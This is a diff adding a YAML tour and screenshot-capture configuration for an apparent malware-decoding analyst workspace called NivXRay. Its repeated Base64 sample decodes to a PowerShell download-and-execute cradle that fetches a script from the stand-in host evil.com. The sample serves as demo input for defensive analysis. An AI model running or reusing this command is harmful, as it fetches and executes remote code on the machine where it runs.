@@ -1,0 +1,79 @@
+id: workspace_tour
+title: NivXRay Workspace Tour · Getting Started
+purpose: A visual walkthrough of the Analyst Workspace — paste, decode, inspect, understand the Threat Analysis, Chain, Flow, and Graph views. Read this first.
+steps:
+  - title: Open the Workspace
+    action: Click WORKSPACE in the top nav. This is the analyst's main screen — everything happens here.
+    expected: An empty input textarea on the left, output/results area on the right, and a row of action buttons at the top.
+  - title: Paste a suspicious command
+    action: Paste the encoded blob into the large input textarea in the centre of the screen.
+    expected: The status line shows the number of characters detected and (for Base64) the auto-detected format hint.
+  - title: Run Smart Decode
+    action: Click the green SMART DECODE button in the top action bar. NivXRay picks the best decoder chain automatically.
+    expected: Within 1–2 seconds the OUTPUT panel populates with the decoded plaintext and a chain of stages appears below (Base64 → UTF-16LE → …).
+  - title: Open the Candidate Explorer
+    action: Click SHOW CANDIDATE EXPLORER (right side of the results). Every candidate encoding is scored with structured reasons.
+    expected: A ranked list of candidates (Base64 wins, Base58/ROT13 lose). Each loser shows a "why not" panel with severity chips.
+  - title: Read the Threat Analysis
+    action: Look at the verdict card in the top-right — verdict (Malicious / Suspicious / Benign) plus confidence bar, MITRE ATT&CK chips, and extracted IOCs (URLs, IPs, domains).
+    expected: The verdict card, IOC chips, and MITRE technique chips are all visible.
+  - title: Inspect the Investigation Timeline
+    action: Scroll down to the INVESTIGATION TIMELINE section. Every event (decode, correction, benchmark run, enrichment lookup, TAXII push) is logged in chronological order.
+    expected: A vertical timeline card with at least one entry (the decode you just ran).
+related_features: [base64_decode, candidate_explorer, threat_intel_enrichment, investigation_timeline, auto_investigate]
+
+# --------------------------------------------------------------
+# Screenshot capture instructions — Phase 1 (Analyst walk-around)
+# Consumed by /app/backend/scripts/capture_docs_screenshots.py
+# --------------------------------------------------------------
+capture:
+  login: true
+  base_sample: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+  steps:
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      delay_ms: 900
+      full_page: false
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      delay_ms: 900
+      full_page: false
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-nivxray-decode"]'
+      delay_ms: 3500
+      post_click_ms: 3000
+      full_page: false
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-nivxray-decode"]'
+      delay_ms: 3500
+      post_click_ms: 3500
+      full_page: true
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="toggle-candidate-explorer"]'
+      delay_ms: 4000
+      post_click_ms: 3000
+      full_page: true
+    - url: /workspace
+      wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-auto-investigate-inline"]'
+      delay_ms: 4000
+      post_click_ms: 6000
+      full_page: true
